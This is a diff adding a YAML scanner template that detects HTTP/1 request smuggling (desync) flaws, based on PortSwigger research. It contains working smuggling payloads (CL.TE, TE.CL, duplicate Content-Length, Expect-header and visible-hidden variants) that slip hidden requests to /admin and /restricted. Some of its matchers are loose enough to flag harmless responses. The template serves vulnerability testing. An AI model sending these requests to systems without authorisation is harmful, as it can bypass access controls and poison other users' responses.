@@ -1,0 +1,203 @@
+id: http1-desync-detection
+
+info:
+  name: HTTP/1 Request Smuggling (Desync) Detection
+  author: nconsolo
+  severity: high
+  description: |
+    Detects HTTP/1 request smuggling vulnerabilities caused by parser discrepancies
+    between front-end and back-end servers. 
+    
+    Based on groundbreaking research by James Kettle (@albinowax) from PortSwigger:
+    "HTTP/1 Must Die" - demonstrating fundamental flaws in HTTP/1.1 specification
+    that enable request smuggling attacks through "extreme ambiguity" in request
+    boundary definitions.
+    
+    This template implements the attack patterns James Kettle used to discover
+    vulnerabilities in major infrastructure providers (Cloudflare, T-Mobile, 
+    GitLab, Netlify, Akamai) earning over $350,000 in bug bounties.
+    
+    Research Credit: James Kettle - PortSwigger Web Security
+    Original Research: https://portswigger.net/research/http1-must-die
+  reference:
+    - https://portswigger.net/research/http1-must-die
+    - https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
+    - https://portswigger.net/web-security/request-smuggling
+  classification:
+    cwe-id: CWE-444
+    cve-id: N/A
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+  metadata:
+    research-author: "James Kettle (@albinowax)"
+    research-org: "PortSwigger Web Security"
+    discovery-year: "2019"
+  tags: desync,smuggling,http,james-kettle,portswigger
+
+variables:
+  random_path: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      # V-H (Visible-Hidden) Desync Test
+      # James Kettle's visible-hidden parser discrepancy attack
+      # Source: "HTTP/1 Must Die" - demonstrated against major CDNs
+      - |
+        GET /{{random_path}}_vh HTTP/1.1
+        Host: {{Hostname}}
+        Foo: bar
+        Content-Length: 23
+        
+        GET /404 HTTP/1.1
+        X: y
+      
+      - |
+        GET /{{random_path}}_normal HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        
+      # 0.CL (Zero Content-Length) Desync Test
+      # James Kettle's IIS/T-Mobile Content-Length: 0 exploit
+      # Source: Successful bug bounty research against major infrastructure  
+      - |
+        GET /{{random_path}}_0cl HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 0
+        Content-Length: 44
+        
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+        
+      
+      - |
+        GET /{{random_path}}_check HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        
+      # CL.TE (Content-Length vs Transfer-Encoding) Test
+      # James Kettle's foundational HTTP/1.1 specification flaw
+      # Source: Core finding demonstrating fundamental request boundary ambiguity
+      - |
+        POST /{{random_path}}_clte HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 13
+        Transfer-Encoding: chunked
+        
+        0
+        
+        GET /admin HTTP/1.1
+        Host: {{Hostname}}
+        
+      
+      - |
+        GET /{{random_path}}_verify HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        
+      # Expect Header Desync Test
+      # James Kettle's T-Mobile/LastPass Expect: 100-continue exploit
+      # Source: Authentication bypass research earning significant bug bounties
+      - |
+        POST /{{random_path}}_expect HTTP/1.1
+        Host: {{Hostname}}
+        Expect: 100-continue
+        Content-Length: 42
+        
+        GET /restricted HTTP/1.1
+        Host: {{Hostname}}
+        
+      
+      - |
+        GET /{{random_path}}_final HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        
+      # TE.CL (Transfer-Encoding vs Content-Length) Test
+      # James Kettle's reverse CL.TE attack pattern
+      # Source: Advanced desync technique for response queue poisoning
+      - |
+        POST /{{random_path}}_tecl HTTP/1.1
+        Host: {{Hostname}}
+        Transfer-Encoding: chunked
+        Content-Length: 4
+        
+        5e
+        POST /admin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 10
+        
+        smuggled=1
+        0
+        
+      
+      - |
+        GET /{{random_path}}_last HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        
+
+    unsafe: true
+    pipeline: true
+    pipeline-concurrent-connections: 1
+    pipeline-http-version: "1.1"
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: vh-desync
+        dsl:
+          - 'contains(body_2, "404") && !contains(url_2, "404")'
+          - 'status_code_2 == 404 && !contains(url_2, "404")'
+        condition: or
+
+      - type: dsl
+        name: 0cl-desync
+        dsl:
+          - 'contains(body_4, "admin")'
+          - 'status_code_4 == 403 || status_code_4 == 401'
+          - '!contains(body_4, "{{random_path}}_check")'
+        condition: or
+
+      - type: dsl
+        name: clte-desync
+        dsl:
+          - 'contains(body_6, "admin")'
+          - 'status_code_6 == 403 || status_code_6 == 401'
+          - 'status_code_6 == 400'
+        condition: or
+
+      - type: dsl
+        name: expect-desync
+        dsl:
+          - 'contains(body_8, "restricted")'
+          - 'status_code_8 == 403 || status_code_8 == 401'
+          - '!contains(body_8, "{{random_path}}_final")'
+        condition: or
+
+      - type: dsl
+        name: tecl-desync
+        dsl:
+          - 'contains(body_10, "admin")'
+          - 'status_code_10 == 403 || status_code_10 == 401'
+          - 'contains(body_10, "smuggled")'
+        condition: or
+
+      - type: word
+        name: response-splitting
+        words:
+          - "HTTP/1.1 "
+        part: body
+        condition: and
+
+      - type: regex
+        name: multiple-responses
+        regex:
+          - 'HTTP/1\.[01]\s+\d{3}.*HTTP/1\.[01]\s+\d{3}'
+        part: body
+
+    extractors:
+      - type: regex
+        name: desync-indicator
+        regex:
+          - '(404|403|401|400|admin|restricted|smuggled)'
+        part: body
